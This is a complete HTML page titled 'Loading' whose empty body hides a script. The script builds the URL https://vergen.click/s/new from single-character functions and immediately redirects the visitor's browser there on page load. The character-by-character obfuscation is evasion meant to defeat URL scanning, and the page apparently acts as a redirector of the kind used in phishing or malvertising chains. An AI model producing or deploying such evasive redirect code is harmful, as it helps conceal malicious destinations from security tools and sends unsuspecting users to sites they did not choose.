<!DOCTYPE html>
<html>
<head>
    <title>Loading</title>
    <script>
        const parts = [
            () => 'h',
            function() { return 't'; },
            _ => 't',
            function() { return 'p'; },
            _ => 's',
            () => ':',
            function() { return '/'; },
            _ => '/',
            function() { return 'v'; },
            _ => 'e',
            function() { return 'r'; },
            function() { return 'g'; },
            _ => 'e',
            function() { return 'n'; },
            function() { return '.'; },
            function() { return 'c'; },
            _ => 'l',
            () => 'i',
            function() { return 'c'; },
            () => 'k',
            function() { return '/'; },
            () => 's',
            () => '/',
            () => 'n',
            () => 'e',
            function() { return 'w'; }
        ];
        const url = parts.reduce((acc, fn) => acc + fn(), '');
        document.location = url;
    </script>
</head>
<body></body>
</html>
